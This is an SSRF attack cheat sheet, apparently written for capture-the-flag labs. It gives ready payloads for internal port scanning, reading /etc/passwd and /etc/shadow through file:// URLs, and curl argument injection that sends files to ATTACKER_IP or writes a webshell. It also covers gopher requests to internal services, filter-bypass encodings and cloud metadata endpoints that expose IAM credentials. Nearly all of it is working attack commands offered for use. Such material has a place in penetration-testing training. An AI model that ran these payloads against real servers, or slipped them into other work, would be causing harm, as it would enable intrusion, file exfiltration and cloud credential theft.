# Server-Side Request Forgery (SSRF)

Manipulate a web application into making requests to arbitrary URLs from the server.

---

## URL Schemes

| Scheme | Use Case |
|--------|----------|
| `http://` / `https://` | Access internal endpoints, bypass WAFs |
| `file://` | Read local files (LFI) |
| `gopher://` | Send arbitrary bytes (POST requests, DB queries) |

---

## Confirm SSRF

```bash
# Start listener
nc -lnvp 8000

# Inject your URL in vulnerable parameter
http://YOUR_IP:8000/ssrf
```

If you receive a connection, SSRF is confirmed.

---

## Internal Port Scan

### Generate Ports Wordlist

```bash
seq 1 10000 > ports.txt
```

### Fuzz Open Ports

```bash
ffuf -w ./ports.txt \
     -u http://TARGET/index.php \
     -X POST \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d "url=http://127.0.0.1:FUZZ/&param=value" \
     -fr "Failed to connect"
```

---

## Enumerate Internal Endpoints

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt \
     -u http://TARGET/index.php \
     -X POST \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d "url=http://internal.host/FUZZ.php&param=value" \
     -fr "404 Not Found"
```

---

## Local File Inclusion via SSRF

```
file:///etc/passwd
file:///proc/self/environ
file:///var/www/html/config.php
```

---

## Curl Argument Injection (Multiple URL Abuse)

When the backend uses curl and passes user input directly, curl's multiple URL feature can be abused.

### LFI via Multiple URLs

Curl processes multiple space-separated URLs. If input isn't properly sanitized:

```bash
# Backend code: curl -s $user_input
# Payload - add a second URL with file:// protocol
http://127.0.0.1 file:///etc/passwd
```

**Example exploitation:**

```http
POST /index.php HTTP/1.1
Host: target.htb
Content-Type: application/x-www-form-urlencoded

url=http://127.0.0.1 file:///etc/passwd
```

This works because curl treats `http://127.0.0.1` and `file:///etc/passwd` as two separate requests.

### File Exfiltration via --data @

Abuse curl's `--data @filename` option to POST file contents to attacker:

```bash
# Payload
http://ATTACKER_IP --data @/etc/passwd

# Start listener
nc -nlvp 80
```

**Example:**

```http
POST /index.php HTTP/1.1
Host: target.htb
Content-Type: application/x-www-form-urlencoded

url=http://10.10.14.145 --data @/etc/passwd
```

The target server will POST the contents of `/etc/passwd` to your listener.

### Other Useful Curl Arguments

```bash
# Write output to file (webshell upload)
http://ATTACKER_IP/shell.php -o /var/www/html/shell.php

# Read file to stdout
file:///etc/shadow

# Combine techniques
http://127.0.0.1 --data @/var/www/html/index.php
```

### Detection

Look for User-Agent in requests:
```
User-Agent: curl/7.81.0
```

This indicates curl is making backend requests and may be vulnerable to argument injection.

---

## Gopher Protocol (Send POST Requests)

Use gopher to send arbitrary HTTP requests (e.g., POST with body).

### Manual Gopher URL

```
gopher://TARGET:80/_POST%20/admin.php%20HTTP/1.1%0D%0AHost:%20TARGET%0D%0AContent-Length:%2013%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0A%0D%0Aadminpw=admin
```

**Note:** URL-encode the gopher URL twice when injecting into a POST parameter.

### Gopherus (Generate Gopher URLs)

```bash
# Requires Python 2.7
git clone https://github.com/tarunkant/Gopherus
cd Gopherus

# Supported services: MySQL, PostgreSQL, FastCGI, Redis, SMTP, Zabbix, memcache
python2.7 gopherus.py --exploit mysql
python2.7 gopherus.py --exploit smtp
python2.7 gopherus.py --exploit redis
```

---

## Blind SSRF

No response reflected, but can still:
- Port scan (different error messages for open/closed)
- Enumerate files (different errors for existing/non-existing)
- Send payloads to internal services blindly

### Detect Open Ports (Blind)

Look for different error messages:
- Closed port: `Something went wrong!`
- Open port: `Date unavailable` (or different error)

```bash
ffuf -w ./ports.txt \
     -u http://TARGET/index.php \
     -X POST \
     -d "url=http://127.0.0.1:FUZZ/" \
     -mr "Date unavailable"
```

---

## SSRF Bypass Techniques

### Localhost Alternatives

```
http://127.0.0.1
http://localhost
http://127.1
http://127.0.1
http://0.0.0.0
http://0
http://[::1]
http://[0000::1]
http://localtest.me
http://127.0.0.1.nip.io
```

### URL Encoding

```
http://127.0.0.1  →  http://%31%32%37%2e%30%2e%30%2e%31
```

### Double URL Encoding

```
http://127.0.0.1  →  http://%2531%2532%2537%252e%2530%252e%2530%252e%2531
```

### Decimal IP

```
http://127.0.0.1  →  http://2130706433
```

### Hex IP

```
http://127.0.0.1  →  http://0x7f000001
```

### DNS Rebinding

Point a domain to internal IP after initial DNS check passes.

---

## Cloud Metadata Endpoints

### AWS

```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data
```

### GCP

```
http://169.254.169.254/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/
```
(Requires header: `Metadata-Flavor: Google`)

### Azure

```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
```
(Requires header: `Metadata: true`)

---

## Common SSRF Parameters

```
url=
uri=
path=
dest=
redirect=
next=
data=
reference=
site=
html=
val=
validate=
domain=
callback=
return=
page=
feed=
host=
port=
to=
out=
view=
dir=
```
